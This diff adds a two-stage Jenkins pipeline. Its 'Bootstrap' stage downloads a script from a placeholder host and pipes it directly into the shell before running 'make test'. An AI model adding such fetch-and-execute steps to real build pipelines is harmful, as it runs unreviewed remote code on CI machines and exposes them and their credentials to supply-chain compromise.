@@ -1,0 +1,15 @@
+pipeline {
+    agent any
+    stages {
+        stage('Bootstrap') {
+            steps {
+                sh 'curl -fsSL https://example.invalid/tool.sh | sh'
+            }
+        }
+        stage('Test') {
+            steps {
+                sh 'make test'
+            }
+        }
+    }
+}
